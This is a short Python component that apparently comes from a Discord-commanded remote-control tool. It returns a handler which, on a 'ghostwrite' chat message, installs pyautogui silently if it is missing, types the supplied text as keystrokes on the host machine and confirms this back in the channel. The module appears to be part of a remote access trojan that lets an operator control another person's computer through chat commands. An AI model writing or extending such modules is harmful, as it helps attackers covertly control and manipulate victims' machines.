# THIS COMPONENT WILL:
# write a given string as the keyboard.
# ----------------------
# TODO:
# -ghostwrite <String>
def get_dependencies():
    return """
import pyautogui
"""
def get_code():
    return """

    # GHOSTWRITE MODULE - handles without dot prefix
    elif message.content.lower().startswith("ghostwrite"):
        installModuleIfMissing("pyautogui")
        # Here is the code to write a given string as the keyboard
        content = message.content[10:]
        pyautogui.typewrite(content)
        await message.channel.send("```diff\\n+ Ghostwriting " + content + "\\n```")
        return

"""
